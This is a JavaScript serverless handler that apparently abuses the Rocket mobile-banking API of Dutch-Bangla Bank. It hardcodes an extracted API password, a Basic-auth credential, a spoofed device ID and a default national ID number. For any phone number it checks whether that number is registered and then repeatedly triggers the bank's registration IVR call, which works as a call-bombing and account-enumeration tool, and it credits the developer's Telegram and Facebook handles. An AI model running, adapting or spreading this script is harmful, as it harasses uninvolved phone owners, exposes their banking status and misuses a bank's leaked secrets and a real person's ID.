import crypto from "crypto";

const CONFIG = {
  API_PASSWORD: "sdfheu$*sdfGw2",
  BASIC_AUTH: "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj",
  BASE_URL: "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1",
  DEVICE_ID: "ANDROID-01968184976",
  DEVICE_INFO: "SP1A.210812.016-itel S665L",
  CLIENT_VERSION: "3.1.6",
  DEFAULT_NID: "5845888855",
  LOOP_COUNT: 2,
};

const DEVELOPER_INFO = {
  TgCnl: "@Efty67",
  Developer: "Efty",
  Contact: "https://www.facebook.com/share/1CYjkMi4y7/?mibextid=wwXIfr",
};

// ─────────────────────────── CRYPTO ───────────────────────────
function getKey(salt) {
  return crypto.pbkdf2Sync(CONFIG.API_PASSWORD, salt, 65536, 32, "sha256");
}

function encryptPayload(payload) {
  const raw = Buffer.from(JSON.stringify(payload), "utf8");
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = getKey(salt);

  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const ciphertext = Buffer.concat([cipher.update(raw), cipher.final()]);
  const tag = cipher.getAuthTag();

  return Buffer.concat([iv, salt, ciphertext, tag]).toString("base64");
}

function decryptPayload(b64) {
  const raw = Buffer.from(b64, "base64");
  if (raw.length < 48) {
    throw new Error("Invalid encrypted payload length");
  }

  const iv = raw.subarray(0, 16);
  const salt = raw.subarray(16, 32);
  const tag = raw.subarray(raw.length - 16);
  const ct = raw.subarray(32, raw.length - 16);
  const key = getKey(salt);

  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);

  const pt = Buffer.concat([decipher.update(ct), decipher.final()]).toString("utf8");
  return JSON.parse(pt);
}

function makeRefId(prefix = "login") {
  const now = new Date();
  const pad = (n, len = 2) => String(n).padStart(len, "0");
  const dt =
    now.getFullYear().toString() +
    pad(now.getMonth() + 1) +
    pad(now.getDate()) +
    pad(now.getHours()) +
    pad(now.getMinutes()) +
    pad(now.getSeconds()) +
    pad(now.getMilliseconds(), 3);

  return `${prefix}--${dt}`;
}

function randSession(prefix = "") {
  const num = crypto.randomInt(1000000, 9999999);
  return `${prefix}${num}`;
}

// ─────────────────────────── API ───────────────────────────
async function apiCall(endpoint, payload, token = null) {
  const headers = {
    CHANNEL_ID: "ROCKET_APP_USER",
    "Content-Type": "application/json; charset=utf-8",
    Connection: "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.9.3",
    Authorization: token ? `Bearer ${token}` : `Basic ${CONFIG.BASIC_AUTH}`,
  };

  const encrypted = encryptPayload(payload);
  const body = JSON.stringify({ userData: encrypted });

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000);

  try {
    const res = await fetch(`${CONFIG.BASE_URL}/${endpoint}`, {
      method: "POST",
      headers,
      body,
      signal: controller.signal,
    });

    const text = await res.text();
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}: ${text}`);
    }

    let json;
    try {
      json = JSON.parse(text);
    } catch {
      throw new Error(`Invalid JSON response: ${text}`);
    }

    if (json && typeof json.userData === "string" && json.userData.length > 0) {
      return decryptPayload(json.userData);
    }
    return json;
  } finally {
    clearTimeout(timeoutId);
  }
}

// ─────────────────────────── SINGLE ITERATION ───────────────────────────
async function runSingleIteration(phone, nid) {
  // 1) login
  const loginResp = await apiCall("login", {
    apiId: 102,
    deviceId: CONFIG.DEVICE_ID,
    deviceInfo: CONFIG.DEVICE_INFO,
    clientVersion: CONFIG.CLIENT_VERSION,
    refId: makeRefId("login"),
    sessionId: randSession("1"),
    clientLanguage: "EN",
    data: {
      appType: "C",
      rocketSessionId: randSession("12"),
      userId: phone,
      version: CONFIG.CLIENT_VERSION,
    },
  });

  if (loginResp?.status !== "SUCCESS") {
    return {
      ok: false,
      registered: false,
      message: loginResp?.message || "Login failed",
    };
  }

  const token = loginResp?.data?.accessToken;
  const sessionId = loginResp?.data?.sessionId || randSession("1");

  // 2) userService / init
  const userResp = await apiCall(
    "userService",
    {
      apiId: 3042,
      deviceId: CONFIG.DEVICE_ID,
      deviceInfo: CONFIG.DEVICE_INFO,
      clientVersion: CONFIG.CLIENT_VERSION,
      refId: makeRefId("reg-init"),
      sessionId,
      clientLanguage: "EN",
      data: {
        appType: "C",
        initiatorId: phone,
        rocketSessionId: randSession("76"),
        userId: "",
        version: CONFIG.CLIENT_VERSION,
        deviceType: "ANDROID",
      },
    },
    token
  );

  if (userResp?.status !== "SUCCESS") {
    return {
      ok: false,
      registered: false,
      message: userResp?.message || "userService failed",
    };
  }

  const userData = userResp?.data || {};
  const userType = userData?.userType ?? "?";
  const promtUser = userData?.promtUser ?? "";

  if (userType === "OLD") {
    return { ok: true, registered: true, message: "Already registered" };
  }

  if (userType !== "NEW") {
    return {
      ok: false,
      registered: false,
      message: `Unknown user type: ${userType}`,
    };
  }

  // 3) NID check
  const nidResp = await apiCall(
    "userService",
    {
      apiId: 3002,
      deviceId: CONFIG.DEVICE_ID,
      deviceInfo: CONFIG.DEVICE_INFO,
      clientVersion: CONFIG.CLIENT_VERSION,
      refId: makeRefId("nid-check"),
      sessionId,
      clientLanguage: "EN",
      data: {
        nidNo: nid,
        initiatorId: phone,
      },
    },
    token
  );

  if (nidResp?.status !== "SUCCESS") {
    return {
      ok: false,
      registered: false,
      message: nidResp?.message || "NID check failed",
    };
  }

  // 4) Final trigger (IVR)
  try {
    const finalResp = await apiCall(
      "userService",
      {
        apiId: 3034,
        deviceId: CONFIG.DEVICE_ID,
        deviceInfo: CONFIG.DEVICE_INFO,
        clientVersion: CONFIG.CLIENT_VERSION,
        refId: makeRefId("reg-init"),
        sessionId: randSession("1"),
        clientLanguage: "EN",
        data: {
          appType: "C",
          initiatorId: phone,
          rocketSessionId: randSession("76"),
          userId: "",
          version: CONFIG.CLIENT_VERSION,
          deviceType: "ANDROID",
        },
      },
      token
    );

    if (finalResp?.status === "SUCCESS") {
      return { ok: true, registered: false, message: "IVR call initiated" };
    }

    if (promtUser === "Y") {
      return {
        ok: true,
        registered: false,
        message: finalResp?.message || "Call request queued",
      };
    }

    return {
      ok: false,
      registered: false,
      message: finalResp?.message || "Final trigger failed",
    };
  } catch (err) {
    if (promtUser === "Y") {
      return { ok: true, registered: false, message: "Call request queued" };
    }
    return {
      ok: false,
      registered: false,
      message: err?.message || "Final trigger error",
    };
  }
}

// ─────────────────────────── MAIN FLOW ───────────────────────────
async function runFlow(phone, nid = CONFIG.DEFAULT_NID, loops = CONFIG.LOOP_COUNT) {
  let anyOk = false;
  let alreadyReg = false;
  let lastMessage = "";

  for (let i = 0; i < loops; i++) {
    let r;
    try {
      r = await runSingleIteration(phone, nid);
    } catch (err) {
      r = { ok: false, registered: false, message: err?.message || "Error" };
    }

    if (r.ok) anyOk = true;
    if (r.registered) alreadyReg = true;
    if (r.message) lastMessage = r.message;

    if (alreadyReg && anyOk) break;
  }

  return {
    status: anyOk ? "success" : "failed",
    registered: alreadyReg,
    message: anyOk
      ? alreadyReg
        ? "Already registered"
        : "IVR call initiated"
      : lastMessage || "Failed",
  };
}

// ─────────────────────────── ENTRY ───────────────────────────
export default async function handler(req, res) {
  res.setHeader("Content-Type", "application/json; charset=utf-8");

  const query = req.query || {};
  const rawPhone = String(query.num ?? "").trim();

  if (rawPhone === "") {
    return res.status(200).json({
      status: "failed",
      number: "",
      message: "Phone number required",
      ...DEVELOPER_INFO,
    });
  }

  if (!/^01\d{9}$/.test(rawPhone)) {
    return res.status(200).json({
      status: "failed",
      number: rawPhone,
      message: "Invalid phone number (11 digits, starts with 01)",
      ...DEVELOPER_INFO,
    });
  }

  const flow = await runFlow(rawPhone, CONFIG.DEFAULT_NID, CONFIG.LOOP_COUNT);

  return res.status(200).json({
    status: flow.status,
    number: rawPhone,
    ...DEVELOPER_INFO,
  });
}
